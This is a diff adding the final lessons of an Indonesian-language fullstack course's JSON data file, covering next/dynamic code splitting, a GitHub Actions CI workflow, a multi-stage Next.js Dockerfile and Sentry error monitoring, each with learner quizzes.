+          "Mengimpor library client berat (seperti editor WYSIWYG atau Canvas) secara statis di root page alih-alih menggunakan dynamic import.",
+          "Lupa menyediakan komponen Loading Skeleton saat menggunakan `next/dynamic`."
+        ],
+        "keyTerms": [
+          {
+            "term": "Code Splitting",
+            "definition": "Teknik memecah satu bundle JavaScript raksasa menjadi potongan-potongan file kecil (chunks) yang dimuat sesuai kebutuhan rute."
+          },
+          {
+            "term": "next/dynamic",
+            "definition": "Ekstensi Next.js dari `React.lazy` yang mendukung Server-Side Rendering dan opsi penonaktifan SSR (`ssr: false`)."
+          },
+          {
+            "term": "SSR: false",
+            "definition": "Opsi untuk menginstruksikan Next.js agar komponen tersebut HANYA dirender di sisi client browser (tanpa proses prerender di server)."
+          }
+        ],
+        "contentMd": "# Code Splitting & Lazy Loading (next/dynamic)\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari **Code Splitting & Dynamic Imports**: bagaimana memecah bundle JavaScript raksasa menggunakan **`next/dynamic`**, memuat library berat (seperti Grafik Analitik atau Rich Text Editor) secara **On-Demand**, serta memanfaatkan opsi **`{ ssr: false }`**.\n\n## Mengapa Konsep Ini Penting?\nBayangkan dashboard Anda memiliki fitur \"Export Laporan PDF\" yang menggunakan library seberat 800 KB. Jika Anda mengimpor library tersebut secara statis biasa, SEMUA pengguna (bahkan yang hanya ingin melihat profil) terpaksa mengunduh 800 KB kode tersebut. Dynamic Imports memungkinkan kode tersebut diunduh **HANYA saat tombol Export PDF diklik!**\n\n## 1. Menerapkan Dynamic Imports dengan `next/dynamic`\n\n```tsx\nimport dynamic from \"next/dynamic\";\n\n// 1. Impor Komponen Berat Secara Dinamis di Latar Belakang:\nconst GrafikPenjualanBerat = dynamic(\n  () => import(\"@/components/GrafikPenjualan\"),\n  {\n    // Tampilkan Skeleton saat file JS grafik 500 KB sedang diunduh:\n    loading: () => <div className=\"h-64 bg-slate-100 animate-pulse rounded-xl\" />,\n    \n    // Opsi ssr: false (Hanya render di browser jika library butuh 'window' object)\n    ssr: false, \n  }\n);\n\nexport function DashboardAdmin() {\n  const [tampilkanGrafik, setTampilkanGrafik] = useState(false);\n\n  return (\n    <div>\n      <h1>Dashboard Analitik</h1>\n      <button onClick={() => setTampilkanGrafik(true)}>\n        Buka Laporan Grafik\n      </button>\n\n      {/* File JS Grafik HANYA diunduh dari server saat tombol di atas diklik! */}\n      {tampilkanGrafik && <GrafikPenjualanBerat />}\n    </div>\n  );\n}\n```\n\n## 2. Kapan Wajib Menggunakan `{ ssr: false }`?\nBanyak library pihak ketiga (seperti **Leaflet Maps**, **Chart.js**, atau **Canvas Editor**) langsung memanggil objek `window` atau `document` saat diinisialisasi.\n- Jika dieksekusi di Server (Node.js), server akan langsung crash: `ReferenceError: window is not defined`.\n- Menambahkan **`{ ssr: false }`** memberitahu Next.js untuk **tidak merender komponen ini di server** dan menunda eksekusinya hingga sampai di browser client dengan aman.\n\n## Kesalahan Umum Pemula\n- **Memakai next/dynamic untuk tombol kecil 2 baris**: Overhead pemecahan chunk dinamis untuk komponen sepele justru menambah jumlah network roundtrip. Gunakan `next/dynamic` HANYA untuk **komponen besar (> 50 KB), modal popup tersembunyi, atau library grafik/editor**.\n\n## Praktik Mandiri\n1. Buat komponen Modal Dialog konfirmasi hapus akun.\n2. Bungkus modal tersebut dengan `next/dynamic` sehingga kodenya hanya diunduh saat user menekan tombol \"Hapus Akun\".\n\n## Ringkasan\n- **Code Splitting** memecah bundle JavaScript menjadi potongan kecil on-demand.\n- Gunakan **`next/dynamic`** untuk memuat komponen berat hanya saat dibutuhkan.\n- Gunakan **`{ ssr: false }`** untuk library yang tidak kompatibel dengan Server-Side Rendering (membutuhkan `window`).\n- Selalu sediakan **`loading` skeleton** untuk transisi visual yang mulus.",
+        "quizzes": [
+          {
+            "id": "q-20-3-1",
+            "question": "Apa tujuan dan manfaat utama dari menerapkan teknik Code Splitting menggunakan next/dynamic pada aplikasi React/Next.js?",
+            "options": [
+              "Memecah bundle JavaScript aplikasi menjadi potongan kecil sehingga browser hanya mengunduh kode yang benar-benar dibutuhkan pada halaman saat itu, secara drastis mempercepat Initial Page Load dan menurunkan Total Blocking Time.",
+              "Mengubah file JavaScript menjadi file database SQL.",
+              "Menghilangkan kebutuhan styling CSS.",
+              "Memaksa pengguna mengunduh seluruh file proyek di awal."
+            ],
+            "correctIndex": 0,
+            "explanation": "Code splitting memisahkan kode menjadi lazy chunks yang dimuat on-demand, mengurangi beban parsing dan eksekusi JS pada main thread browser."
+          },
+          {
+            "id": "q-20-3-2",
+            "question": "Kapan opsi { ssr: false } pada fungsi next/dynamic WAJIB digunakan?",
+            "options": [
+              "Ketika mengimpor library pihak ketiga yang mengakses API browser secara langsung (seperti window atau document pada library Leaflet Maps/Canvas) yang akan memicu error crash jika dieksekusi di lingkungan server.",
+              "Hanya saat website tidak memiliki database.",
+              "Ketika komponen tidak memiliki teks.",
+              "Hanya saat mode gelap aktif."
+            ],
+            "correctIndex": 0,
+            "explanation": "Opsi ssr: false mencegah komponen di-prerender di server Node.js, menghindari ReferenceError: window is not defined pada library client-only."
+          },
+          {
+            "id": "q-20-3-3",
+            "question": "Komponen manakah di bawah ini yang PALING COCOK untuk diimpor menggunakan next/dynamic?",
+            "options": [
+              "Library Rich Text WYSIWYG Editor atau Library Grafik Chart yang berukuran besar (> 500 KB) dan hanya muncul di halaman tertentu atau di dalam modal dialog.",
+              "Tombol panah kecil di navbar.",
+              "Tag paragraf teks biasa.",
+              "Komponen layout root html."
+            ],
+            "correctIndex": 0,
+            "explanation": "Komponen dengan ukuran bundle besar dan frekuensi render kondisional (seperti chart/editor) memberikan penghematan bundle paling maksimal saat di-lazy load."
+          }
+        ]
+      },
+      {
+        "id": "lesson-20-4",
+        "stageId": "stage-20",
+        "slug": "ci-cd-pipeline-dengan-github-actions",
+        "title": "CI/CD Pipeline Otomatis dengan GitHub Actions",
+        "titleEn": "CI/CD with GitHub Actions",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Membangun alur Continuous Integration & Continuous Deployment (CI/CD) otomatis dengan GitHub Actions (.github/workflows/ci.yml): linting (ESLint), type-checking (tsc), automated testing (Vitest), dan auto-deployment.",
+        "prerequisites": [
+          "code-splitting-dan-next-dynamic-imports"
+        ],
+        "learningObjectives": [
+          "Menjelaskan konsep Continuous Integration (CI) dan Continuous Deployment (CD).",
+          "Menyusun file workflow GitHub Actions `.github/workflows/ci.yml` berbasis YAML.",
+          "Mengotomatiskan tahapan pemeriksaan Pull Request: linting, type-checking (`tsc --noEmit`), dan automated tests.",
+          "Mengelola Environment Secrets (API Keys, Database URL) secara aman di GitHub Secrets."
+        ],
+        "whyMatters": "CI/CD bertindak sebagai robot penjaga kualitas otomatis yang menolak dan memblokir penggabungan (merge) kode yang memiliki bug, salah ketik tipe, atau tes gagal.",
+        "careerContext": "Pengetahuan alur kerja CI/CD otomatis adalah standar wajib seluruh tim engineering profesional di seluruh dunia.",
+        "commonMistakes": [
+          "Menuliskan password database secara terang-terangan di dalam file YAML (selalu gunakan `${{ secrets.DATABASE_URL }}`).",
+          "Mengabaikan kegagalan tahap CI dan tetap memaksakan merge kode yang rusak ke branch `main`."
+        ],
+        "keyTerms": [
+          {
+            "term": "Continuous Integration (CI)",
+            "definition": "Praktik otomatisasi pengujian, linting, dan build setiap kali ada kode baru yang di-push ke repository."
+          },
+          {
+            "term": "Continuous Deployment (CD)",
+            "definition": "Praktik merilis kode yang telah lolos seluruh pengujian CI ke server produksi secara otomatis tanpa intervensi manual."
+          },
+          {
+            "term": "GitHub Actions",
+            "definition": "Platform automasi CI/CD bawaan GitHub berbasis file konfigurasi YAML."
+          }
+        ],
+        "contentMd": "# CI/CD Pipeline Otomatis dengan GitHub Actions\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari **CI/CD (Continuous Integration & Continuous Deployment)**: menyusun robot automasi menggunakan **GitHub Actions (`.github/workflows/ci.yml`)** untuk menguji kode, memvalidasi tipe TypeScript, dan mencegah kode rusak masuk ke lingkungan produksi.\n\n## Mengapa Konsep Ini Penting?\nTanpa CI/CD, seorang rekan tim bisa saja melakukan push kode yang memiliki kesalahan ketik tipe atau unit test yang gagal langsung ke server produksi dan mematikan website toko online Anda. CI/CD secara otomatis menguji setiap baris kode di setiap Pull Request sebelum diizinkan rilis!\n\n## 1. Anatomi Workflow CI (`.github/workflows/ci.yml`)\nBuat file konfigurasi YAML di folder `.github/workflows/ci.yml`:\n\n```yaml\nname: Continuous Integration Pipeline\n\n# Jalankan otomatis pada setiap PUSH ke main dan setiap PULL REQUEST:\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  quality-check:\n    name: Lint, Typecheck & Automated Test\n    runs-on: ubuntu-latest\n\n    steps:\n      # 1. Unduh kode dari repository:\n      - name: Checkout Repository\n        uses: actions/checkout@v4\n\n      # 2. Siapkan Node.js Runtime:\n      - name: Setup Node.js 20\n        uses: actions/setup-node@v4\n        with:\n          node-version: 20\n          cache: \"npm\"\n\n      # 3. Instal Dependensi:\n      - name: Install Dependencies\n        run: npm ci\n\n      # 4. Tahap 1: Validasi Linting ESLint:\n      - name: Run ESLint\n        run: npm run lint\n\n      # 5. Tahap 2: Validasi Tipe Data TypeScript (Type-Check):\n      - name: Run TypeScript Type-Check\n        run: npx tsc --noEmit\n\n      # 6. Tahap 3: Jalankan Automated Unit & Integration Tests:\n      - name: Run Automated Tests\n        run: npm test -- --run\n\n      # 7. Tahap 4: Uji Produksi Build:\n      - name: Test Production Build\n        run: npm run build\n        env:\n          DATABASE_URL: ${{ secrets.DATABASE_URL }}\n```\n\n## 2. Bagaimana CI/CD Melindungi Branch Main?\nKetika developer membuka Pull Request di GitHub:\n1. Robot GitHub Actions otomatis menyalakan server Ubuntu virtual di cloud.\n2. Robot menjalankan **ESLint $\\rightarrow$ TypeScript Compiler $\\rightarrow$ Vitest $\\rightarrow$ Next.js Build**.\n3. Jika ada satu saja error, GitHub memberi tanda silang merah (**❌ Checks Failed**) dan **MENGUNCI tombol Merge**.\n4. Kode HANYA bisa digabung jika semua lampu hijau (**✅ All checks have passed**).\n\n## 3. Mengelola Rahasia dengan GitHub Secrets\nJangan pernah menaruh password database di dalam file YAML:\n- Buka repository GitHub $\\rightarrow$ **Settings** $\\rightarrow$ **Secrets and variables** $\\rightarrow$ **Actions**.\n- Tambahkan `DATABASE_URL` dan panggil dengan sintaks aman: `${{ secrets.DATABASE_URL }}`.\n\n## Kesalahan Umum Pemula\n- **Memakai `npm install` di CI alih-alih `npm ci`**: `npm ci` dirancang khusus untuk lingkungan automasi yang menjamin instalasi versi paket yang persis 100% sesuai `package-lock.json`.\n\n## Praktik Mandiri\n1. Buat file `.github/workflows/ci.yml` pada repository proyek Anda.\n2. Push ke GitHub dan buka tab **Actions** untuk melihat proses automasi berjalan secara langsung.\n\n## Ringkasan\n- **Continuous Integration (CI)** mengotomatiskan linting, type-checking, dan testing pada setiap perubahan kode.\n- **Continuous Deployment (CD)** merilis kode yang lolos pengujian langsung ke server hosting.\n- Gunakan **GitHub Secrets** untuk mengamankan kredensial environment variables.",
+        "quizzes": [
+          {
+            "id": "q-20-4-1",
+            "question": "Apa fungsi utama dari Continuous Integration (CI) pipeline menggunakan GitHub Actions dalam pengembangan perangkat lunak tim?",
+            "options": [
+              "Secara otomatis menjalankan tahapan pengujian kualitas (linting, type-checking TypeScript, unit tests, dan build) pada setiap Pull Request untuk memblokir penggabungan kode yang memiliki bug ke branch utama.",
+              "Membayar tagihan server cloud otomatis.",
+              "Mengubah bahasa pemrograman repository.",
+              "Menghapus seluruh issue yang dibuat pengguna."
+            ],
+            "correctIndex": 0,
+            "explanation": "CI mengotomatiskan verifikasi integritas kode secara berkelanjutan, mencegah regresi bug masuk ke basis kode utama."
+          },
+          {
+            "id": "q-20-4-2",
+            "question": "Mengapa perintah npm ci jauh lebih direkomendasikan daripada npm install di dalam script automasi CI/CD GitHub Actions?",
+            "options": [
+              "npm ci dirancang khusus untuk lingkungan automasi yang melakukan instalasi bersih (clean install) berdasarkan package-lock.json secara persis dan lebih cepat tanpa memodifikasi lockfile.",
+              "npm ci tidak memerlukan koneksi internet.",
+              "npm install dilarang oleh server Linux.",
+              "npm ci membuat file ZIP otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "npm ci (clean install) menjamin determinisme dependensi yang identik 100% dan memiliki kecepatan instalasi lebih tinggi di runner CI."
+          },
+          {
+            "id": "q-20-4-3",
+            "question": "Di manakah tempat yang BENAR dan aman untuk menyimpan kredensial sensitif seperti DATABASE_URL atau API Secret Keys pada alur kerja GitHub Actions?",
+            "options": [
+              "Di dalam GitHub Repository Settings -> Secrets and variables -> Actions (GitHub Secrets), lalu dipanggil via ${{ secrets.KEY }}",
+              "Ditulis langsung secara terbuka di file README.md",
+              "Disimpan di dalam komentar file ci.yml",
+              "Diunggah sebagai file foto"
+            ],
+            "correctIndex": 0,
+            "explanation": "GitHub Encrypted Secrets menyimpan kredensial secara terenkripsi dan menyamarkannya dari log terminal runner."
+          }
+        ]
+      },
+      {
+        "id": "lesson-20-5",
+        "stageId": "stage-20",
+        "slug": "docker-containerization-dan-deployment",
+        "title": "Docker Containerization & Deployment Produksi (Self-Hosted & Vercel)",
+        "titleEn": "Docker Containerization & Production Deployment",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Membungkus aplikasi Next.js ke dalam kontainer Docker terisolasi: Dockerfile multi-stage build (deps, builder, runner), standalone output, optimasi image alpine, dan deployment (Vercel vs VPS Coolify/Docker).",
+        "prerequisites": [
+          "ci-cd-pipeline-dengan-github-actions"
+        ],
+        "learningObjectives": [
+          "Menjelaskan konsep Containerization: mengemas aplikasi beserta seluruh dependensi lingkungannya ke dalam image Docker portabel.",
+          "Menyusun Dockerfile Multi-Stage Build berkinerja tinggi untuk Next.js dengan output standalone.",
+          "Mengurangi ukuran image Docker dari 1.5 GB menjadi < 150 MB menggunakan Node.js Alpine base image.",
+          "Membandingkan kelebihan deployment Serverless (Vercel) vs Self-Hosted VPS (Docker / Coolify / Dokku)."
+        ],
+        "whyMatters": "Docker menjamin aplikasi Anda berjalan dengan perilaku yang persis 100% sama di laptop Mac, laptop Windows, server Linux staging, hingga server produksi (*'It works on my machine' solved!*).",
+        "careerContext": "Keahlian Docker dan Cloud Deployment adalah penentu kemandirian seorang Senior Fullstack Engineer dalam merilis produk.",
+        "commonMistakes": [
+          "Lupa menyetel `output: 'standalone'` di `next.config.ts` saat menggunakan Docker (mengakibatkan seluruh folder `node_modules` 1 GB harus ikut dimasukkan ke image).",
+          "Menjalankan kontainer sebagai user `root` (selalu buat user non-root `nextjs` demi keamanan container escape protection)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Docker Container",
+            "definition": "Unit perangkat lunak standar yang membungkus kode dan seluruh dependensinya sehingga aplikasi berjalan cepat dan andal di lingkungan komputasi apa pun."
+          },
+          {
+            "term": "Multi-Stage Build",
+            "definition": "Metode pembuatan Docker image bertingkat untuk menyalin HANYA file hasil kompilasi final, membuang seluruh alat build yang tidak diperlukan."
+          },
+          {
+            "term": "Standalone Output",
+            "definition": "Fitur Next.js yang secara otomatis mengekstrak hanya dependensi minimal yang dibutuhkan untuk menjalankan server produksi mandiri."
+          }
+        ],
+        "contentMd": "# Docker Containerization & Deployment Produksi (Self-Hosted & Vercel)\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari **Docker Containerization**: membungkus aplikasi Next.js fullstack ke dalam kontainer portabel menggunakan **Multi-Stage Dockerfile**, mengaktifkan **Standalone Output**, merampingkan ukuran image hingga **< 150 MB**, serta strategi deployment (**Vercel vs Self-Hosted VPS**).\n\n## Mengapa Konsep Ini Penting?\nPernahkah Anda mengalami masalah: *\"Di laptop saya kodenya jalan normal, tapi pas di-deploy ke server Linux kodenya error\"*? Docker menghilangkan masalah tersebut dengan membungkus aplikasi beserta sistem operasi Linux, versi Node.js, dan dependensinya ke dalam satu kontainer terisolasi yang dijamin berjalan identik di mana saja.\n\n## 1. Mengaktifkan Standalone Output di `next.config.ts`\nFitur ini membuat Next.js melacak dan menyalin HANYA file yang benar-benar dipakai di produksi:\n\n```typescript\n// File: next.config.ts\nimport type { NextConfig } from \"next\";\n\nconst nextConfig: NextConfig = {\n  output: \"standalone\", // KUNCI: Menghasilkan build mandiri super ramping!\n};\n\nexport default nextConfig;\n```\n\n## 2. Dockerfile Multi-Stage Build Standar Produksi\n\n```dockerfile\n# File: Dockerfile\n\n# TAHAP 1: Dependensi\nFROM node:20-alpine AS deps\nWORKDIR /app\nCOPY package.json package-lock.json ./\nRUN npm ci\n\n# TAHAP 2: Builder\nFROM node:20-alpine AS builder\nWORKDIR /app\nCOPY --from=deps /app/node_modules ./node_modules\nCOPY . .\nENV NEXT_TELEMETRY_DISABLED 1\nRUN npx prisma generate\nRUN npm run build\n\n# TAHAP 3: Runner Produksi (Ultra Ramping < 150 MB)\nFROM node:20-alpine AS runner\nWORKDIR /app\nENV NODE_ENV production\nENV NEXT_TELEMETRY_DISABLED 1\n\n# Keamanan: Jalankan sebagai user non-root\nRUN addgroup --system --gid 1001 nodejs\nRUN adduser --system --uid 1001 nextjs\n\n# Salin HANYA file hasil build standalone:\nCOPY --from=builder /app/public ./public\nCOPY --from=builder --chown=nextjs:nodejs /app/.next/standalone ./\nCOPY --from=builder --chown=nextjs:nodejs /app/.next/static ./.next/static\n\nUSER nextjs\nEXPOSE 3000\nENV PORT 3000\n\nCMD [\"node\", \"server.js\"]\n```\n\n## 3. Strategi Deployment: Vercel vs Self-Hosted VPS\n\n| Kriteria | Serverless Platform (Vercel) | Self-Hosted VPS (Docker / Coolify / Hetzner) |\n| :--- | :--- | :--- |\n| **Kemudahan** | **Tinggal Sambung GitHub (Zero-Config)** | Butuh konfigurasi server VPS sendiri |\n| **Skalabilitas** | Otomatis skala jutaan request | Terbatas pada spesifikasi RAM/CPU VPS |\n| **Biaya Skala Besar** | Bisa mahal saat traffic/bandwidth tinggi | **Sangat Murah & Terprediksi (Fix $5–$20/bln)** |\n| **Akses Database** | Butuh Database Cloud Terpisah (Supabase/Neon)| Bisa satu server dengan PostgreSQL Docker |\n\n## Kesalahan Umum Pemula\n- **Membuat Docker image 1 lapis tanpa multi-stage**: Menghasilkan Docker image berukuran raksasa 2 GB yang lambat diunduh server. Dengan Multi-Stage, ukuran terpangkas menjadi **~140 MB**.\n\n## Praktik Mandiri\n1. Bangun image Docker lokal: `docker build -t belajarinaja-app .`.\n2. Jalankan kontainer lokal: `docker run -p 3000:3000 belajarinaja-app` dan buka `http://localhost:3000`.\n\n## Ringkasan\n- **Docker** mengemas aplikasi agar berjalan konsisten di seluruh lingkungan.\n- **`output: 'standalone'`** mengekstrak server minimal produksi.\n- **Multi-Stage Build** membuang file development dan merampingkan image hingga $< 150$ MB.\n- Pilih **Vercel** untuk kecepatan rilis atau **Docker VPS (Coolify)** untuk kontrol biaya penuh.",
+        "quizzes": [
+          {
+            "id": "q-20-5-1",
+            "question": "Apa fungsi dari konfigurasi output: 'standalone' di dalam file next.config.ts saat menyiapkan aplikasi untuk Docker containerization?",
+            "options": [
+              "Menginstruksikan Next.js untuk secara otomatis melacak dan membundel HANYA file dependensi minimal yang diperlukan untuk menjalankan server produksi, memangkas ukuran image Docker secara drastis tanpa perlu menyalin seluruh folder node_modules raksasa.",
+              "Membuat aplikasi berjalan tanpa koneksi internet.",
+              "Menghapus seluruh file database.",
+              "Mengubah Next.js menjadi aplikasi desktop Windows .exe."
+            ],
+            "correctIndex": 0,
+            "explanation": "Output standalone menghasilkan folder mandiri yang hanya memuat file yang benar-benar terpakai di runtime, merampingkan ukuran image Docker."
+          },
+          {
+            "id": "q-20-5-2",
+            "question": "Apa keunggulan utama dari menerapkan pola 'Multi-Stage Build' di dalam sebuah file Dockerfile?",
+            "options": [
+              "Memisahkan tahapan instalasi dependensi, kompilasi build, dan runtime akhir, sehingga image produksi final hanya berisi berkas eksekusi bersih tanpa menyertakan compiler dan dev-dependencies yang berat.",
+              "Membuat kontainer Docker otomatis memiliki 5 alamat IP.",
+              "Mempercepat kecepatan browsing pengguna.",
+              "Menghilangkan kebutuhan sistem operasi Linux."
+            ],
+            "correctIndex": 0,
+            "explanation": "Multi-stage builds mengisolasi artefak build di stage sementara dan hanya menyalin hasil akhir ke stage runner, menghasilkan image berukuran sangat kecil dan aman."
+          },
+          {
+            "id": "q-20-5-3",
+            "question": "Mengapa di dalam Dockerfile produksi kita WAJIB membuat user sistem non-root (seperti adduser nextjs) dan menjalankannya dengan perintah USER nextjs?",
+            "options": [
+              "Sebagai standar keamanan pertahanan: mencegah serangan Container Escape di mana jika aplikasi berhasil dieksploitasi oleh hacker, hacker tidak mendapatkan hak akses administrator (root) penuh ke sistem operasi host server.",
+              "Karena user root dilarang oleh konsorsium Docker.",
+              "Agar kontainer bisa memutar musik.",
+              "Untuk menghemat penggunaan kuota internet."
+            ],
+            "correctIndex": 0,
+            "explanation": "Prinsip Least Privilege mewajibkan proses aplikasi berjalan sebagai non-root user untuk membatasi kerusakan jika terjadi eksploitasi keamanan kontainer."
+          }
+        ]
+      },
+      {
+        "id": "lesson-20-6",
+        "stageId": "stage-20",
+        "slug": "monitoring-observability-dan-error-tracking-sentry",
+        "title": "Monitoring, Observability & Error Tracking (Sentry, OpenTelemetry)",
+        "titleEn": "Monitoring, Observability & Sentry Error Tracking",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Memantau kesehatan aplikasi di lingkungan produksi secara real-time: Error Tracking dengan Sentry, Real User Monitoring (RUM), OpenTelemetry tracing, log aggregation, dan kesiapan arsitektur Fullstack modern.",
+        "prerequisites": [
+          "docker-containerization-dan-deployment"
+        ],
+        "learningObjectives": [
+          "Mengintegrasikan platform Error Tracking Sentry (@sentry/nextjs) untuk menangkap runtime exception di client dan server.",
+          "Menganalisis Real User Monitoring (RUM) dan Core Web Vitals langsung dari perangkat pengguna nyata di lapangan.",
+          "Menjelaskan konsep Observability (Logs, Metrics, Traces).",
+          "Menyusun arsitektur pemeliharaan aplikasi jangka panjang (Maintainability & Continuous Improvement)."
+        ],
+        "whyMatters": "Di lingkungan produksi, Anda tidak bisa meminta pengguna membuka DevTools saat terjadi error. Sentry otomatis memberi tahu Anda nomor baris kode yang rusak, jenis perangkat, dan rekaman aksi user sebelum crash terjadi.",
+        "careerContext": "Keahlian Monitoring dan Observability adalah tanda puncak kedewasaan seorang Senior Fullstack Engineer / Tech Lead.",
+        "commonMistakes": [
+          "Baru mengetahui aplikasi mengalami error fatal setelah ada komplain viral dari pelanggan di media sosial (karena tidak memasang error tracking otomatis).",
+          "Mengirimkan data sensitif password/token ke log Sentry (selalu aktifkan data scrubbing / PII sanitization)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Observability",
+            "definition": "Kemampuan untuk mengukur dan memahami kondisi internal suatu sistem berdasarkan data keluaran eksternalnya (Logs, Metrics, Traces)."
+          },
+          {
+            "term": "Sentry",
+            "definition": "Platform error tracking dan performance monitoring nomor satu untuk aplikasi web dan cloud."
+          },
+          {
+            "term": "Real User Monitoring (RUM)",
+            "definition": "Pengumpulan data performa dan error nyata langsung dari interaksi pengguna di dunia sebenarnya."
+          }
+        ],
+        "contentMd": "# Monitoring, Observability & Error Tracking (Sentry, OpenTelemetry)\n\n## Apa yang Akan Dipelajari?\nPada materi penutup ini, Anda telah mencapai puncak kurikulum Fullstack Web Developer! Anda akan mempelajari **Monitoring & Observability**: bagaimana memantau kesehatan aplikasi secara real-time di lingkungan produksi menggunakan **Sentry**, melacak performa pengguna nyata (**RUM**), serta merangkum seluruh fondasi keahlian modern Anda.\n\n## Mengapa Konsep Ini Penting?\nKetika website Anda sudah dipakai oleh 100.000 pengguna, bug tak terduga pasti akan terjadi. Apakah Anda harus menunggu pelanggan marah di media sosial? Sistem monitoring modern memberi tahu Anda dalam 1 detik saat terjadi error: lengkap dengan rekaman layar (*Session Replay*), jenis HP pengguna, dan baris kode yang rusak!\n\n## 1. Tiga Pilar Observability (Logs, Metrics, Traces)\n\n```text\n┌─────────────────────────────────────────────────────────────┐\n│ 1. LOGS    ──> Catatan kejadian diskrit (Timestamp + Pesan) │\n│ 2. METRICS ──> Angka statistik agregat (CPU %, LCP, Latency)│\n│ 3. TRACES  ──> Perjalanan request melewati berbagai modul   │\n└─────────────────────────────────────────────────────────────┘\n```\n\n## 2. Mengintegrasikan Sentry di Next.js (`@sentry/nextjs`)\n\n```bash\nnpx @sentry/wizard@latest -i nextjs\n```\n\nFile konfigurasi otomatis dibuat:\n```typescript\n// File: sentry.client.config.ts\nimport * as Sentry from \"@sentry/nextjs\";\n\nSentry.init({\n  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,\n  // 1. Rekam jejak performa (Tracing):\n  tracesSampleRate: 0.1, // Rekam 10% transaksi untuk efisiensi kuota\n  \n  // 2. Rekam sesi video layar saat terjadi error (Session Replay):\n  replaysOnErrorSampleRate: 1.0, // 100% rekam jika terjadi crash!\n  \n  // 3. Sanitasi Privasi Data Pengguna (PII Masking):\n  maskAllText: true,\n  blockAllMedia: true,\n});\n```\n\n## 3. Menangkap Error Kustom di Server Action / API\n\n```typescript\nimport * as Sentry from \"@sentry/nextjs\";\n\nexport async function prosesPembayaranAction(orderId: string) {\n  try {\n    await eksekusiPembayaran(orderId);\n  } catch (error) {\n    // Kirim laporan detail error ke Dashboard Sentry:\n    Sentry.captureException(error, {\n      extra: { orderId, waktu: new Date().toISOString() },\n      tags: { fitur: \"payment-gateway\" }\n    });\n    \n    throw new Error(\"Pembayaran gagal diproses\");\n  }\n}\n```\n\n## 4. Selamat! Perjalanan Anda Menjadi Fullstack Web Developer Modern\nAnda telah menyelesaikan **20 Stage dan 115 Materi Kurikulum BelajarinAja**:\n1. **Dasar Web**: HTML5 Semantik, Aksesibilitas, dan CSS Box Model.\n2. **Layout Modern**: Flexbox, CSS Grid, dan Responsive Mobile-First.\n3. **Bahasa Pemrograman**: Git, JavaScript Deep Dive (Event Loop, Closures, Async/Await), dan TypeScript Type Safety.\n4. **Frontend Modern**: React 19, Tailwind CSS v4, Hooks, dan Zustand State Management.\n5. **Fullstack Architecture**: Next.js 16 App Router, Server Components, Server Actions, dan RESTful API Zod.\n6. **Database & Keamanan**: PostgreSQL, Prisma ORM, OWASP Top 10, Auth Session/JWT, dan Rate Limiting.\n7. **Performa & Produksi**: Core Web Vitals, CI/CD GitHub Actions, Docker, dan Sentry Monitoring.\n\nAnda sekarang memiliki pondasi yang kokoh, berstandar industri internasional, dan siap membangun produk web kelas dunia!\n\n## Kesalahan Umum Pemula\n- **Membiarkan token sensitif terkirim ke log monitoring**: Pastikan Anda selalu menyalakan data sanitization agar password dan nomor kartu kredit disamarkan (*masked*).\n\n## Praktik Mandiri\n1. Buat akun gratis di [sentry.io](https://sentry.io).\n2. Hubungkan ke proyek Next.js Anda dan picu error uji coba `throw new Error(\"Test Sentry Crash\")` untuk melihat laporan masuk di dashboard Sentry.\n\n## Ringkasan\n- **Observability (Logs, Metrics, Traces)** memantau kondisi kesehatan sistem produksi secara real-time.\n- **Sentry** menangkap error runtime beserta rekaman stack trace dan session replay.\n- Lindungi privasi pengguna dengan **PII Data Masking**.\n- Terapkan seluruh 20 stage ini sebagai standar kualitas dalam setiap proyek profesional Anda!",
+        "quizzes": [
+          {
+            "id": "q-20-6-1",
+            "question": "Apa fungsi utama dari mengintegrasikan platform Error Tracking otomatis seperti Sentry pada aplikasi web di lingkungan produksi?",
+            "options": [
+              "Secara otomatis menangkap dan melaporkan setiap runtime error dan crash yang dialami pengguna nyata secara real-time lengkap dengan stack trace nomor baris kode, tipe perangkat, dan konteks aksi pengguna.",
+              "Membayar gaji developer secara otomatis setiap akhir bulan.",
+              "Menghentikan server saat malam hari.",
+              "Mengubah website menjadi bahasa Spanyol."
+            ],
+            "correctIndex": 0,
+            "explanation": "Sentry memberikan visibilitas instan terhadap bug yang terjadi di lingkungan produksi tanpa harus menunggu laporan manual dari pengguna."
+          },
+          {
+            "id": "q-20-6-2",
+            "question": "Apakah 3 pilar utama yang menyusun konsep 'Observability' dalam sistem rekayasa perangkat lunak modern?",
+            "options": [
+              "Logs, Metrics, dan Traces",
+              "HTML, CSS, dan JavaScript",
+              "Input, Process, dan Output",
+              "CPU, RAM, dan Harddisk"
+            ],
+            "correctIndex": 0,
+            "explanation": "Tiga pilar Observability standar industri adalah Logs (catatan event), Metrics (data statistik numerik agregat), dan Traces (alur request terdistribusi)."
+          },
+          {
+            "id": "q-20-6-3",
+            "question": "Mengapa penting untuk mengaktifkan fitur Data Masking / PII Sanitization pada konfigurasi tools error monitoring seperti Sentry?",
+            "options": [
+              "Untuk mencegah data pribadi sensitif pengguna (seperti password, nomor identitas KTP, atau kartu kredit) ikut terkirim dan tersimpan di log server monitoring, menjaga kepatuhan privasi (GDPR/UU PDP).",
+              "Karena Sentry menolak teks yang panjang.",
+              "Untuk menghemat biaya langganan internet.",
+              "Agar error tidak bisa dibaca oleh admin."
+            ],
+            "correctIndex": 0,
+            "explanation": "PII (Personally Identifiable Information) masking adalah kepatuhan hukum wajib untuk menyaring data sensitif sebelum dikirim ke pihak monitoring eksternal."
+          }
+        ]
+      }
+    ]
+  }
+];
